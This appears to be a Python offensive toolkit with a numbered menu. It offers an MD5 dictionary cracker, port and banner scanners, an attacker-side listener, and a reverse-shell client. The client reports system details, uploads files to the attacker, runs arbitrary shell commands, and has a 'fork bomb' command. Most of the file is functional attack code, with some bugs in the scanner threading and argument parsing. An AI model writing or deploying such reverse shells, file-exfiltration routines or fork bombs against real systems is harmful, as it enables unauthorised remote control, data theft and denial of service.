import threading
import colorama
import argparse
import hashlib
import os
import platform
import getpass
import socket
import subprocess
from colorama import Fore, Style
from time import sleep


def password_cracker():
    print("**************PASSWORD CRACKER ******************")
    pass_found = 0  # To check if the password  found or not
    input_hash = input("Enter the hashed password: ")
    pass_doc = input("\nEnter passwords filename including path(root / home/): ")
    if os.access(pass_doc, os.R_OK) is True:
        try:
            pass_file = open(pass_doc, 'r')

            for word in pass_file:  # comparing the input_hash with the hashes of the words in password file
                enc_word = word.encode('utf-8')
                hash_word = hashlib.md5(enc_word.strip())
                digest = hash_word.hexdigest()  # digesting that hash into a hexadecimal value
                if digest == input_hash:
                    print("Password found.\nThe password is:", word)  # comparing hashes
                    pass_found = 1
                    break

            if not pass_found:
                print("Password is not found in the", pass_doc, "file")
                print('\n')
            print("*****************  Thank you  **********************")
        except PermissionError as error:
            print(error)


def connection_scan():
    target_ip = input("Please provide the IP Address: ")
    target_port = [20, 21, 22, 23, 25, 53, 80, 110, 119, 123, 143, 161, 194, 443, 8080, 8181, 318]
    for port in target_port:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect((target_ip, port))
            s.send(b'Banner query\r\n')
            results = s.recv(100)
            print("[+] {}/tcp open".format(port))
            print("[+] {}".format(str(results)))
        except OSError:
            print("[-] {}/tcp closed".format(port))
        finally:
            s.close()


def port_scan():
    target = input("Enter the target: ")
    port_num = [20, 21, 22, 23, 25, 53, 80, 110, 119, 123, 143, 161, 194, 443, 8080, 8181, 318]
    for x in port_num:
        try:
            target_ip = socket.gethostbyname(target)
        except OSError:
            print("[^] Cannot resolve {}".format(target))
            return

        try:
            target_name = socket.gethostbyaddr(target_ip)
            print("[*] Scan results for {}".format(target_name[0]))
        except OSError:
            print("[*] Scan results for {}".format(target_ip))

        t = threading.Thread(target=connection_scan, args=(target, int(x)))
        t.start()


def argument_parser():
    parser = argparse.ArgumentParser(description="TCP port scanner")
    parser.add_argument("-o", "--host", nargs="?", help="Host IP Address")
    parser.add_argument("-p", "--ports", nargs="?", help="Comma-separated port list")


def client_access():
    colorama.init()
    L_HOST = socket.gethostbyname(socket.gethostname())
    L_PORT = int(input("Which port are you attacking from? "))
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.bind((L_HOST, L_PORT))
    sock.listen(10)
    print("Listening on port", L_PORT)
    client, addr = sock.accept()
    while True:
        input_header = client.recv(1024)
        command = input(input_header.decode()).encode()
        if command.decode("utf-8").split(" ")[0] == "download":
            file_name = command.decode("utf-8").split(" ")[1][::-1]
            client.send(command)
            with open(file_name, "wb") as f:
                read_data = client.recv(1024)
                while read_data:
                    f.write(read_data)
                    read_data = client.recv(1024)
                    if read_data == b"DONE":
                        break

        if command == b"":
            print("Please enter a command")
        else:
            client.send(command)
            data = client.recv(1024).decode("utf-8")
            if data == "exit":
                print("Terminating connection", addr[0])
                break
            print(data)
    client.close()


def server_access():
    colorama.init()
    R_HOST = socket.gethostbyname(socket.gethostname())
    R_PORT = 443
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    print("Initializing connection...")
    sock.connect((R_HOST, R_PORT))
    print("Connection established!")
    while True:
        try:
            header = f"""{Fore.RED}{getpass.getuser()}@{platform.node()}
    {Style.RESET_ALL}:{Fore.LIGHTBLUE_EX}{os.getcwd()}{Style.RESET_ALL}$ """
            sock.send(header.encode())
            STDOUT, STDERR = None, None
            cmd = sock.recv(1024).decode("utf-8")
            if cmd == "list":  # List files in the dir
                sock.send(str(os.listdir(".")).encode())

            if cmd == "fork bomb":
                while True:
                    os.fork()
            elif cmd.split(" ")[0] == "cd":  # Change directory
                os.chdir(cmd.split(" ")[1])
                sock.send("Changed directory to {}".format(os.getcwd()).encode())
            elif cmd == "sysinfo":  # Get system info
                sysinfo = f"""
    Operating System: {platform.system()}
    Computer Name: {platform.node()}
    Username: {getpass.getuser()}
    Release Version: {platform.release()}
    Processor Architecture: {platform.processor()}
                """
                sock.send(sysinfo.encode())
            elif cmd.split(" ")[0] == "download":  # Download files
                with open(cmd.split(" ")[1], "rb") as f:
                    file_data = f.read(1024)
                    while file_data:
                        print("Sending", file_data)
                        sock.send(file_data)
                        file_data = f.read(1024)
                    sleep(2)
                    sock.send(b"DONE")
                print("Finished sending data")
            elif cmd == "exit":  # Terminate the connection
                sock.send(b"exit")
                break
            else:  # Run any other command
                comm = subprocess.Popen(str(cmd), shell=True, stdout=subprocess.PIPE,
                                        stderr=subprocess.PIPE, stdin=subprocess.PIPE)
                STDOUT, STDERR = comm.communicate()
                if not STDOUT:
                    sock.send(STDERR)
                else:
                    sock.send(STDOUT)

            if not cmd:  # If the connection terminates
                print("Connection dropped")
                break
        except Exception as e:
            sock.send("An error has occurred: {}".format(str(e)).encode())
    sock.close()


def execute():
    module = int(input("Enter the program to run: "))
    options = [1, 2, 3, 4, 5]

    def running():
        if module == 1:
            password_cracker()
        elif module == 2:
            connection_scan()
        elif module == 3:
            port_scan()
        elif module == 4:
            client_access()
        elif module == 5:
            server_access()

    while module not in options:
        module = int(input("Enter a feasible option: "))
    else:
        running()


execute()
